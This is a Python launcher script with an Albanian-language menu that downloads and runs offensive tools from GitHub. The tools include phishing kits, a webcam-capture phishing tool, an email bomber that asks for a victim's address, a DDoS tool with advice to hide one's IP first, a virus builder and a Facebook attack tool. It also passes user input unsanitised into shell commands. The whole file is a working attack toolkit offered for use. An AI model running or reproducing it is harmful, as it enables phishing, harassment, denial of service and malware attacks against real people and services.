# Update Script

import os
import time

os.system('clear')
os.system('mkdir Tools')
os.system('clear')
print('\033[31;40;1m '
      '  █████╗ ██╗             ████████╗ ██████╗  ██████╗ ██╗\n'
      ' ██╔══██╗██║             ╚══██╔══╝██╔═══██╗██╔═══██╗██║\n'
      ' ███████║██║     ███████╗   ██║   ██║   ██║██║   ██║██║\n'
      ' ██╔══██║██║     ╚══════╝   ██║   ██║   ██║██║   ██║██║\n'
      ' ██║  ██║███████╗           ██║   ╚██████╔╝╚██████╔╝███████╗\n'
      ' ╚═╝  ╚═╝╚══════╝           ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ v4\n'
      '  Coded by 4lbH4cker\n'
      '  github: https://github.com/4lbH4cker\n'
      '\033[33;4mVersion:\033[0m 4            \033[33;4mCTRL+C:\033[0m exit          \033[33;4mAuthor:\033[0m 4lbH4cker\n\n'
      '\e[37m[1]\e[36m Kërkesat & Përditësimi        \e[37m[2]\e[36m Phishing Tool                \n'
      '\e[37m[3]\e[36m WebCam Hack                   \e[37m[4]\e[36m Subscan            \n'
      '\e[37m[5]\e[36m Gmail Bomber                  \e[37m[6]\e[36m DDOS Attack            \n'
      '\e[37m[7]\e[36m Si të përdorni ?              \e[37m[8]\e[36m Çinstaloni programet e shkarkuara\n'
      '\e[37m[9]\e[36m Ip Info                       \e[37m[10]\e[36m dorks-eye\n'
      '\e[37m[11]\e[36m HackerPro                     \e[37m[12]\e[36m RED_HAWK\n'
      '\e[37m[13]\e[36m VirusCrafter                  \e[37m[14]\e[36m Info-Site\n'
      '\e[37m[15]\e[36m BadMod                        \e[37m[16]\e[36m Facebash\n'
      '\e[37m[17]\e[36m DARKARMY                     \e[37m[18]\e[36m AUTO-IP-CHANGER\n\n')

# Option Selection
islem = input("Numri i transaksionit: ")

if islem in ['1', '01']:
    os.system('clear')
    print("\033[47;31;5m Po instalon përditësimin dhe kërkesat...\033[0m")
    time.sleep(5)
    os.system('pkg install git -y')
    os.system('pkg install python python3 -y')
    os.system('pkg install pip pip3 -y')
    os.system('pkg install curl -y')
    os.system('apt update')
    os.system('apt upgrade -y')
    os.system('clear')
    print("\033[47;3;35m Përditësimi i plotë...\033[0m")
    time.sleep(3)
    os.system('bash alhack.sh')

elif islem in ['2', '02']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('git clone https://github.com/htr-tech/zphisher')
    os.chdir('zphisher')
    os.system('bash zphisher.sh')

elif islem in ['3', '03']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('git clone https://github.com/techchipnet/CamPhish')
    os.chdir('CamPhish')
    os.system('bash camphish.sh')

elif islem in ['4', '04']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.system('git clone https://github.com/zidansec/subscan')
    os.chdir('subscan')
    sc = input("Jepni nje domain p.sh (example.com): ")
    os.system(f'./subscan {sc}')

elif islem in ['5', '05']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('git clone https://github.com/juzeon/fast-mail-bomber.git')
    os.chdir('fast-mail-bomber/')
    os.system('mv config.example.php config.php')
    os.system('php index.php update-providers')
    os.system('rm -rf data/nodes.json data/dead_providers.json')
    print("\033[47;3;35m Ky instalim do tju marre shum kohe\033[0m")
    print("\033[47;3;35m Per te ndaluar shtypni Ctrl+C\033[0m")
    time.sleep(4)
    os.system('php index.php update-nodes')
    os.system('php index.php refine-nodes')
    print("-------------------------")
    mail = input("Jepni nje adres emaili per te bombarduar: ")
    print("-------------------------")
    os.system(f'php index.php start-bombing {mail}')

elif islem in ['6', '06']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('git clone https://github.com/palahsu/DDoS-Ripper.git')
    os.chdir('DDoS-Ripper')
    os.system('python3 DRipper.py')
    print("")
    print("\033[47;3;35m Para se ta perdorni fshihni ip-n tuaj\033[0m")

elif islem in ['7', '07']:
    os.system('clear')
    print("Youtube Video: https://www.youtube.com/watch?v=zgdq6ErscqY")
    os.system('python3 -m webbrowser https://www.youtube.com/watch?v=zgdq6ErscqY')
    time.sleep(10)
    print("Prisni 10 sekonda")
    os.system('bash alhack.sh')

elif islem in ['8', '08']:
    os.system('clear')
    print("\033[47;3;35m PO HIQEN PROGRAMET E SHKARKUARA...\033[0m")
    time.sleep(3)
    os.system('rm -rf Tools')
    os.system('bash alhack.sh')

elif islem in ['9', '09']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('apt update')
    os.system('apt install git curl')
    os.system('git clone https://github.com/htr-tech/track-ip.git')
    os.chdir('track-ip')
    os.system('bash trackip')

elif islem in ['10', '010']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('git clone https://github.com/BullsEye0/dorks-eye.git')
    os.chdir('dorks-eye')
    os.system('pip install -r requirements.txt')
    os.system('python3 dorks-eye.py')

elif islem in ['11', '011']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('apt update && apt upgrade && apt install git && apt install python2')
    os.system('git clone https://github.com/jaykali/hackerpro.git')
    os.chdir('hackerpro')
    os.system('sudo bash install.sh')
    os.system('python2 hackerpro.py')

elif islem in ['12', '012']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('git clone https://github.com/Tuhinshubhra/RED_HAWK')
    os.chdir('RED_HAWK')
    os.system('php rhawk.php')

elif islem in ['13', '013']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('git clone https://github.com/Devil-Tigers/TigerVirus')
    os.system('apt update')
    os.system('apt upgrade -y')
    os.system('pkg install git -y')
    os.chdir('TigerVirus')
    os.system('bash app.sh')

elif islem in ['14', '014']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('pkg install curl -y')
    os.system('upgrade -y')
    os.system('pkg install git -y')
    os.system('git clone https://github.com/king-hacking/info-site.git')
    os.chdir('info-site')
    os.system('bash info.sh')

elif islem in ['15', '015']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('sudo apt-get update')
    os.system('sudo apt-get install php')
    os.system('sudo apt-get install php-curl')
    os.system('git clone https://github.com/MrSqar-Ye/BadMod.git')
    os.chdir('BadMod')
    os.system('chmod u+x INSTALL')
    os.system('chmod u+x BadMod.php')
    os.system('sudo php BadMod.php')

elif islem in ['16', '016']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('git clone https://github.com/fu8uk1/facebash')
    os.chdir('facebash')
    os.system('bash install.sh')
    os.system('chmod +x facebash.sh')
    os.system('tor')
    os.system('sudo ./facebash.sh')

elif islem in ['17', '017']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('pkg install git')
    os.system('pkg install python2')
    os.system('apt install git')
    os.system('apt install python2')
    os.system('git clone https://github.com/D4RK-4RMY/DARKARMY')
    os.chdir('DARKARMY')
    os.system('chmod +x darkarmy.py')
    os.system('python2 darkarmy.py')

elif islem in ['18', '018']:
    os.system('clear')
    print("\033[47;3;35m Instalimi mund të marrë pak kohe\033[0m")
    print("\033[47;3;35m Ky tool do tju kerkoje te jeni (ROOT)\033[0m")
    time.sleep(3)
    os.chdir('Tools')
    os.system('sudo apt-get install tor')
    os.system('pip3 install requests')
    os.system('git clone https://github.com/FDX100/Auto_Tor_IP_changer.git')
    os.chdir('Auto_Tor_IP_changer')
    print("\033[47;3;35m shkoni te shfletuesi juaj / ndryshoni përfaqësuesin (sock proxy) në 127.0.0.1:9050\033[0m")
    time.sleep(8)
    os.system('python3 install.py')
    os.system('aut')

else:
    os.system('clear')
    print('\033[36;40;1m Keni futur kodin e gabuar')
    time.sleep(1)
    os.system('clear')
    os.system('bash alhack.sh')
